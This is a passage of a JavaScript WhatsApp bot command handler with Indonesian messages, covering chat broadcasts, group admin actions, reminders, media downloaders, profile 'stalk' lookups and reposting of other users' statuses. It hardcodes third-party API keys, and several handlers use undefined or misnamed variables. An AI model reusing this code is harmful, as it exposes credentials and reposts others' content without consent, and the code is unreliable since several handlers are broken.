						bc = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, bc, video, {mimetype: 'video/mp4', duration: 359996400,quoted: meki,caption: `*BROADCAST*\n\n${body.slice(9)}`})
						}
						reply('Suksess broadcast')
					}
					break
	case "bcaudio":
					if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
					anu = await syaa.chats.all()
					if (isMedia && !mek.message.audioMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true,quoted: meki})
						}
						reply('Suksess broadcast')
					}
					break
        case "bcgif":
					if (!isOwner && !mek.key.fromMe) return reply(mess.own)  
			        
					anu = await syaa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, bc, sticker, {mimetype: Mimetype.gif,quoted : meki})
						}
						reply('Suksess broadcast')
					}
					break
        case "clearall":
					
					anu = await syaa.chats.all()
					syaa.setMaxListeners(25)
					for (let _ of anu) {
						syaa.deleteChat(_.jid)
					}
					reply(ind.clears())
					break
					
      // Set Name Group
      case "setname":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (!isGroup) return;
        syaa.groupUpdateSubject(from, `${args.join(" ")}`);
        syaa.sendMessage(from, "Succes change name group", text, {
          quoted: mek,
        });
        break
      // Group Info
      case "groupinfo":
        case "infogrup":
          case "grupinfo":
            case "infogrup":
             
        if (!isGroup) return;
        ppUrl = await syaa.getProfilePicture(from); // leave empty to get your own
        buffergbl = await getBuffer(ppUrl);
        syaa.sendMessage(from, buffergbl, image, {
          quoted: mek,
          caption: `\`\`\`ã€Œ Group Info ã€\`\`\`\n*â€¢> *Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length} \n\n${groupDesc}`,
        });
        break;
        case 'infogrup':
          case 'infogc':
       case 'grupinfo':
       case 'groupinfo':
              if (!isGroup) return reply("Khusus di grup");
              try {
              var pic = await syaa.getProfilePicture(from)
              } catch {
              var pic = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
              let ingfo = `*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length} \n\n${groupMetadata.desc}`
              syaa.sendMessage(from, await getBuffer(pic), image, {quoted: mek, caption: ingfo, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
              break
      // Demote Admins
      case "demote":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Reply members");
        mentionede = mek.message.extendedTextMessage.contextInfo.participant;
        syaa.groupDemoteAdmin(from, [mentionede]);
        teks = `Members @${mentionede.split("@")[0]} succes demote`;
        syaa.sendMessage(from, teks, text, {
          quoted: mek,
          contextInfo: { mentionedJid: [mentionede] },
        });
        break;
      // Promote Members
      case "promote":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Reply members");
        mentionede = mek.message.extendedTextMessage.contextInfo.participant;
        syaa.groupMakeAdmin(from, [mentionede]);
        teks = `Members @${mentionede.split("@")[0]} succes promote`;
        syaa.sendMessage(from, teks, text, {
          quoted: mek,
          contextInfo: { mentionedJid: [mentionede] },
        });
        break;
      case "tutup":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (!isGroup) return;
        reply(`*SUCCES CLOSE GROUP*`);
        syaa.groupSettingChange(from, GroupSettingChange.messageSend, true);
        break;
      case "revoke":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (!isGroup) return;
        syaa.revokeInvite(from);
        reply("```Succes revoke link group```");
        break;
      case "buka":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (!isGroup) return;
        reply(`*SUCCES OPEN GROUP*`);
        syaa.groupSettingChange(from, GroupSettingChange.messageSend, false);
        break;
      case "reminder": // by Slavyan
        if (!q)
          return reply(
            `CONTOH PENGGUNANNYA:\n${prefix}reminder text/2s\n\nNOTE: \n*s* - seconds\n*m* - minutes\n*h* - hours\n*d* - days`
          );
        teks = body.slice(10);
        const messRemind = teks.split("/")[0];
        const timeRemind = teks.split("/")[1];
        typeRemind = "Text";
        if (isQuotedImage) typeRemind = "Image";
        if (isQuotedSticker) typeRemind = "Sticker";
        if (isQuotedAudio) typeRemind = "Audio";
        if (!isQuotedImage && !isQuotedAudio && !isQuotedSticker)
          typeRemind = "Text";
        const parsedTime = ms(toMs(timeRemind));
        reminder.addReminder(
          sender,
          messRemind,
          typeRemind,
          timeRemind,
          _reminder
        );
        if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {
          await syaa.sendMessage(
            from,
            `â”€â”€ ã€Œ REMINDER ã€ â”€â”€
    
Reminder berhasil diaktifkan!
âž¸ Pesan: ${messRemind}
âž¸ Type: Text
âž¸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
âž¸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              syaa.sendMessage(
                from,
                `â”€â”€ ã€Œ REMINDER ã€ â”€â”€

â° @${sender.split("@")[0]} â°
âž¸ Pesan: ${messRemind}
âž¸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedSticker) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await syaa.downloadAndSaveMediaMessage(encmedia);
          await syaa.sendMessage(
            from,
            `â”€â”€ ã€Œ REMINDER ã€ â”€â”€
    
Reminder berhasil diaktifkan!
âž¸ Pesan: ${messRemind}
âž¸ Type: Sticker
âž¸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
âž¸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              syaa.sendMessage(
                from,
                `â”€â”€ ã€Œ REMINDER ã€ â”€â”€

â° @${sender.split("@")[0]} â°
âž¸ Pesan: ${messRemind}
âž¸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              syaa.sendMessage(from, fs.readFileSync(media), sticker);
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedImage) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await syaa.downloadAndSaveMediaMessage(encmedia);
          await syaa.sendMessage(
            from,
            `â”€â”€ ã€Œ REMINDER ã€ â”€â”€
    
Reminder berhasil diaktifkan!
âž¸ Pesan: ${messRemind}
âž¸ Type: Image
âž¸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
âž¸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              teks = `â”€â”€ ã€Œ REMINDER ã€ â”€â”€

â° @${sender.split("@")[0]} â°
âž¸ Pesan: ${messRemind}
âž¸ Type: ${reminder.getReminderType(sender, _reminder)}`;
              syaa.sendMessage(from, media, image, {
                contextInfo: { mentionedJid: [sender] },
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedAudio) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await syaa.downloadAndSaveMediaMessage(encmedia);
          await syaa.sendMessage(
            from,
            `â”€â”€ ã€Œ REMINDER ã€ â”€â”€
    
Reminder berhasil diaktifkan!
âž¸ Pesan: ${messRemind}
âž¸ Type: Audio
âž¸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
âž¸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              syaa.sendMessage(
                from,
                `â”€â”€ ã€Œ REMINDER ã€ â”€â”€

â° @${sender.split("@")[0]} â°
âž¸ Pesan: ${messRemind}
âž¸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              syaa.sendMessage(from, fs.readFileSync(media), audio, {
                contextInfo: { mentionedJid: [sender] },
                mimetype: "audio/mp4",
                ptt: true,
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        }
        break;
      case "jadibot":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (mek.key.fromMe) return reply("Tidak bisa jadibot di dalam bot");
        jadibot(reply, syaa, from);
        break;
      case "stopjadibot":
        if (mek.key.fromMe)
          return reply("tidak bisa stopjadibot kecuali owner");
        stopjadibot(reply);
        break;
      case "listbot":
        let tekss = "ã€Œ *LIST JADIBOT* ã€\n";
        for (let i of listjadibot) {
          tekss += `*Nomor* : ${i.jid.split("@")[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`;
        }
        reply(tekss);
        break;

      //------------------< Fitur yg pake button >-------------------
      case "setprefix":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        sendButMessage(
          from,
          `PREFIX : ${prefixStatus ? "Multi Prefix" : "No Prefix"}`,
          `Silahkan pilih salah satu`,
          [
            {
              buttonId: `${prefix}noprefix`,
              buttonText: {
                displayText: `NOPREFIX`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}multiprefix`,
              buttonText: {
                displayText: `MULTIPREFIX`,
              },
              type: 1,
            },
          ]
        );
        break;
      case "mode":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        sendButMessage(from, `MODE SELF/PUBLIC`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}self`,
            buttonText: {
              displayText: `SELF MODE`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}public`,
            buttonText: {
              displayText: `PUBLIC MODE`,
            },
            type: 1,
          },
        ]);
        break;
      case "grup":
        
        sendButMessage(from, `GROUP SETTING`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}buka`,
            buttonText: {
              displayText: `OPEN`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}tutup`,
            buttonText: {
              displayText: `CLOSE`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}revoke`,
            buttonText: {
              displayText: `REVOKE INVITE`,
            },
            type: 1,
          },
        ]);
        break;
        case "scKATASHIbot":
        reply(`-`)
        break
        

      //------------------< Fitur downloader >-------------------
      case 'tiktoknowm':
				reply('loading...')
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
                    ini_url = args[0]
                    ini_url = `https://bx-hunter.herokuapp.com/api/download/tiktok?url=${ini_url}&apikey=Ikyy69`
                    get_result = await fetchJson(ini_url)
                    ini_buffer = await getBuffer(bv.result.media_resources)
                    syaa.sendMessage(from, ini_buffer, video, { quoted: mek })
                    break
      case "tiktok":
        if (!isUrl(args[0]) && !args[0].includes("tiktok.com"))
          return reply(mess.Iv);
        var bv = await fetchJson(
          `https://bx-hunter.herokuapp.com/api/download/tiktok?url=${args[0]}/ZSJmhusyd/&apikey=Ikyy69`
        );
        var b = bv.result.author_metadata;
        var tamnel = await getBuffer(
          bv.result.media_resources.image.contentUrl
        );
        var a = bv.result.media_metadata;
        sendButImage(
          from,
          `âšœï¸ *Nickname*: ${b.username}\nâ¤ï¸ *Like*: ${a.stats.diggCount}\nðŸ’¬ *Komentar*: ${a.stats.commentCount}\nðŸ” *Share*: ${a.stats.shareCount}\nðŸŽžï¸ *Views*: ${a.stats.playCount}`,
          `Silahkan pilih salah satu format yg mau didownload`,
          tamnel,
          [
            {
              buttonId: `${prefix}tiktokdl ${args[0]}|video`,
              buttonText: {
                displayText: `VIDEO`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}tiktokdl ${args[0]}|audio`,
              buttonText: {
                displayText: `AUDIO`,
              },
              type: 1,
            },
          ]
        );
        break;
        case "tiktokmp3":
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Link gak work')
 		if (!q) return reply('Linknya?')
 		reply('Tunggu bentar')
 		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { audio} = result
            sendMediaURL(from,audio,'')
    		})
     		.catch(e => console.log(e))
     		break
case 'tiktokvid':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Link gak valid')
 		if (!q) return reply('Linknya?')
 		reply("bentar")
		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { wm, nowm, audio } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
    		.then(async (a) => {
    		me = `*Link* : ${a.data}`
		syaa.sendMessage(from,{url:`${nowm}`},video,{mimetype:'video/mp4',quoted:mek,caption:me})
		})
		})
     		.catch(e => console.log(e))
     		break

      case "youtube":
        if (!isUrl(args[0]) && !args[0].includes("youtu"))
          return reply(mess.Iv);
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/youtube/video?url=${args[0]}`
        );
        var b = bv.result.creator_metadata;
        var tamnel = await getBuffer(bv.result.media_resources.thumbnail);
        var a = bv.result.media_metadata;
        sendButImage(
          from,
          `*Name channel*: ${b.name}\nðŸ“œ *Title*: ${a.title}\nâ¤ï¸ *Like*: ${a.totalLikes}\nðŸ‘Ž *Dislike*: ${a.totalDislikes}\nðŸŽžï¸ *Views*: ${a.totalViews}`,
          `Silahkan pilih salah satu format yg mau didownload`,
          tamnel,
          [
            {
              buttonId: `${prefix}ytdl ${args[0]}|video`,
              buttonText: {
                displayText: `VIDEO`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}ytdl ${args[0]}|music`,
              buttonText: {
                displayText: `AUDIO`,
              },
              type: 1,
            },
          ]
        );
        break;
      //JCCHCCGHTHDTRSRS
      case "twitter":
        if (!isUrl(args[0]) && !args[0].includes("twitter.com"))
          return reply(mess.Iv);
        if (!q) return fakegroup("Linknya?");
        ten = args[0];
        var res = await hx.twitter(`${ten}`);
        ren = `${g.HD}`;
        sendMediaURL(from, ren, "DONE");
        break;
      case "facebook":
        if (!q) return reply("Linknya?");
        if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
          return reply(mess.Iv);
        reply(mess.wait);
        te = args.join(" ");
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        break;
      case "instagram":
        if (!isUrl(args[0]) && !args[0].includes("instagram.com"))
          return reply(mess.Iv);
        if (!q) return fakegroup("Linknya?");
        reply(mess.wait);
        hx.igdl(args[0]).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes("mp4")) {
              let link = await getBuffer(i.url);
              syaa.sendMessage(from, link, video, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            } else {
              let link = await getBuffer(i.url);
              syaa.sendMessage(from, link, image, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            }
          }
        });
        break;
      case "tiktokdl":
        var gh = args.join("");
        var link = gh.split("|")[0];
        var ipe = gh.split("|")[1];
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/tiktok/nowatermark?url=${link}`
        );
        if (tipe == "audio") {
          sendMediaURL(from, bv.result.media_resources.music.playUrl, "");
        }
        if (tipe == "video") {
          sendMediaURL(from, bv.result.media_resources.video.videoUrl, "");
        }
        break;
      case "ytdl":
        var gh = args.join("");
        var link = gh.split("|")[0];
        var ipe = gh.split("|")[1];
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/youtube/${tipe}?url=${link}`
        );
        if (tipe == "video") {
          sendMediaURL(from, bv.result.media_resources.videoUrl, "");
        }
        if (tipe == "music") {
          sendMediaURL(from, bv.result.media_resources.musicUrl, "");
        }
        break;

      case "noprefix":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (prefixStatus == false) return reply("No prefix is recently on!");
        prefixStatus = false;
        reply("Berhasil mengganti prefix menjadi noprefix");
        break;
      case "multiprefix":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (prefixStatus == true) return reply("Multi prefix is recently on!");
        prefixStatus = true;
        reply("Berhasil mengganti prefix menjadi multiprefix");
        break;

      case "delvote":
        if (!mek.key.remoteJid) return;
        if (isVote) return reply("Tidak ada sesi Voting");
        delVote(from);
        reply("Sukses Menghapus sesi Voting Di Grup Ini");
        break;
      case "voting":
        if (!isGroupAdmins && !mek.key.fromMe) return;
        if (!isGroup) return reply(mess.only.group);
        if (isVote) return reply("Sesi Voting Sedang Berlangsung Di Grup Ini");
        if (!q)
          return reply(
            "*Voting*\n\n" +
              prefix +
              "voting @tag target | reason  | 1 (1 = 1 Menit)"
          );
        if (
          mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 ||
          mek.message.extendedTextMessage.contextInfo == null
        ) {
          let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
          split = args.join(" ").replace("@", "").split("|");
          if (!Number(split[2]))
            return reply(
              "masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit"
            );
          await mentions(
            "Vote " +
              "@" +
              id.split("@")[0] +
              " Di Mulai" +
              "\n\n" +
              `vote = âœ…\ndevote = âŒ\n\nAlasan: ${split[1]}`,
            [id],
            true
          );
          addVote(from, split[1], split[0], split[2], reply);
        }
        break;
      case "linkwa":
        if (!q) return reply("cari group apa?");
        hx.linkwa(q).then((result) => {
          let res = "*ã€Œ _LINK WA_ ã€*\n\n";
          for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`;
          }
          reply(res);
        });
        break;
      
      case "githubstalk":
        if (!q) return reply("Usernamenya?");
        const oi = await fetchJson(
          `https://api.dhnjing.xyz/stalk/github?user=dehan-j1ng`
        );
        const mm = `*GITHUB STALK*
    Username: ${oi.result.username}
    Fullname: ${oi.result.name}
    Bio: ${oi.result.user_bio}

    Jumlah repo: ${oi.result.user_repo}
    Following: ${oi.result.user_following}
    Follower: ${oi.result.user_followers}`;
        reply(mm);
        break;
      case "tiktokstalk":
        if (!q) return reply("Usernamenya? ");
        var i = await fetchJson(
          `https://api.dhnjing.xyz/stalk/tiktok?user=@${q}`
        );
        buff = await getBuffer(i.result.user.avatarLarger);
        var ii = `*TIKTOK STALK*
    Username: ${q}
    Nickname: ${i.result.user.nickname}
    Bio: ${i.result.user.signature}

    Jumlah postingan: ${i.result.stats.videoCount}
    Following: ${i.result.stats.followingCount}
    Follower: ${i.result.stats.followerCount}`;
        syaa.sendMessage(from, buff, image, { quoted: mek, caption: ii });
        break;
      case "igstory":
        if (!q) return reply("Usernamenya?");
        hx.igstory(q).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes("mp4")) {
              let link = await getBuffer(i.url);
              syaa.sendMessage(from, link, video, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            } else {
              let link = await getBuffer(i.url);
              syaa.sendMessage(from, link, image, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            }
          }
        });
        break;
      case "colongsw": //arif
        if (!mek.key.fromMe) return;
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await syaa.downloadAndSaveMediaMessage(ger);
          syaa.sendMessage(from, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else if ((isMedia && !mek.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await syaa.downloadAndSaveMediaMessage(ger);
          syaa.sendMessage(from, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else {
          reply("Reply sw foto / video yg mau dicolong");
        }
        break;
      case "tulis":
        if (args.length < 1)
          return reply(
            `Usage: ${prefix + command} nama&kelas&nomor absen&kata\n*Example*: ${
              prefix + command
            } udin&20&17&blablabla`
          );
        var bodi = args.join(" ");
        var nama = bodi.split("&")[0];
        var kelas = bodi.split("&")[1];
        var no = bodi.split("&")[2];
        var aksarane = bodi.split("&")[3];
        reply("membuat bos...");
        rakz = await getBuffer(
          `https://zekais-api.herokuapp.com/bukukiri?text=${bodi}&apikey=owLeb2QL`
        );
        syaa.sendMessage(from, rakz, image, {
          quoted: mek,
          thumbnail: Buffer.alloc(0),
        });
        break;

      case "card-game":
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          ted = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          //  console.log(ted)
          var bodi = args.join(" ");
          var nama = bodi.split("|")[0];
          var kelas = bodi.split("|")[1];
          reply("Loading.....");
          owgi = await syaa.downloadAndSaveMediaMessage(ted);
          console.log(owgi);
          anu = await imgbb("dc773cce66f3dcf3ab3bc83dc7bf3555", owgi);
          console.log(anu);
          //reply (anu)

          hehe = await getBuffer(
            `https://fdz-app.herokuapp.com/api/maker/card-game?nama=${nama}&desc=${kelas}&picurl=${anu.display_url}`
          );
          syaa.sendMessage(from, hehe, image, {
            quoted: mek,
            thumbnail: Buffer.alloc(0),
          });
        } else {
          reply(
            `Kirim gambar atau tag gambar yang sudah dikirim lalu  dengan caption ${prefix}card-game nama|teks keterangan `
          );
        }
        break;

      case "sertiff1":
        pll = body.slice(10);
        if (args.length < 1) return reply(prefix);
        reply("Loading.....");
        rakz = await getBuffer(
          `https://fdz-app.herokuapp.com/api/maker/sertif-ff-v1?text=${pll}`
        );
        syaa.sendMessage(from, rakz, image, {
          quoted: mek,
          thumbnail: Buffer.alloc(0),
        });
        break;
      case "bpink":
        pll = body.slice(7);

        if (args.length < 1) return reply(preffk);
        reply("Loading.....");
        rakz = await getBuffer(
          `https://fdz-app.herokuapp.com/api/maker/blackpink?text=${pll}`
        );
        syaa.sendMessage(from, rakz, image, {
          quoted: mek,
          thumbnail: Buffer.alloc(0),
        });
        break;
        case "alam1":
        pll = body.slice(7);
        if (args.length < 1) return reply(preffk);
        reply("Loading.....");
        rakz = await getBuffer(
          `https://rest-api-megumin1.herokuapp.com/api/textmaker/alam?text=${pll}&theme=summer&apikey=Alphabot`
        );
        syaa.sendMessage(from, rakz, image, {
          quoted: mek,
          thumbnail: Buffer.alloc(0),
        });
        break;
case 'wanted':
case 'Wanted':
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://fdz-app.herokuapp.com/api/maker/wanted?picurl=${anu.display_url}`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	break
      
      case "deltrash":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          ted = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          reply("Loading.....");
          owgi = await syaa.downloadAndSaveMediaMessage(ted);
          //	  console.log(owgi)
          anu = await imgbb("3395a377ebac7e9f744c3683b44a2a59", owgi);
          console.log(anu);
          hehe = await getBuffer(
            `https://fdz-app.herokuapp.com/api/maker/deltrash?imgurl=${anu.display_url}`
          );
          syaa.sendMessage(from, hehe, image, {
            quoted: mek,
            thumbnail: Buffer.alloc(0),
          });
        }
        break;

      case "squidrip":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          ted = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          reply("Loading.....");
          owgi = await syaa.downloadAndSaveMediaMessage(ted);
          console.log(owgi);
          anu = await imgbb("dc773cce66f3dcf3ab3bc83dc7bf3555", owgi);
          console.log(anu);
          hehe = await getBuffer(
            `https://fdz-app.herokuapp.com/api/maker/rip?picurl=${anu.display_url}`
          );
          syaa.sendMessage(from, hehe, image, {
            quoted: mek,
            thumbnail: Buffer.alloc(0),
          });
        }
        break;
case 'wasted':
case 'Wasted':
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://fdz-app.herokuapp.com/api/maker/wasted?imgurl=${anu.display_url}`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	break
      //RANDOM IMAGE
     /* case "waifu":
      case "loli":
      case "husbu":
      case "milf":
      case "cosplay":
      case "naruto":
      case "wibu":
      case "aeshtetic":
      case "wallpaperanime":
        let wipu = await fetchJson(
          `https://api.dhnjing.xyz/search/pinterest/image?query=${command}`
        );
        gmbr = wipu.result[Math.floor(Math.random() * wipu.result.lenght)];
        fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(gmbr.orig.url));
        buttons = [
          {
            buttonId: `${prefix + command}`,
            buttonText: { displayText: `âž¡ï¸Next` },
            type: 1,
          },
        ];
        imageMsg = (
          await syaa.prepareMessage(
            from,
            fs.readFileSync(`./${sender}.jpeg`),
            "imageMessage",
            { thumbnail: Buffer.alloc(0) }
          )
        ).message.imageMessage;
        buttonsMessage = {
          footerText: "Jangan Lupa Donasi Ya Kak â˜•",
          imageMessage: imageMsg,
          contentText: `klik Next untuk ke gambar selanjut nya`,
          buttons,
          headerType: 4,
        };
        prep = await syaa.prepareMessageFromContent(
          from,
          { buttonsMessage },
          { quoted: mek }
        );
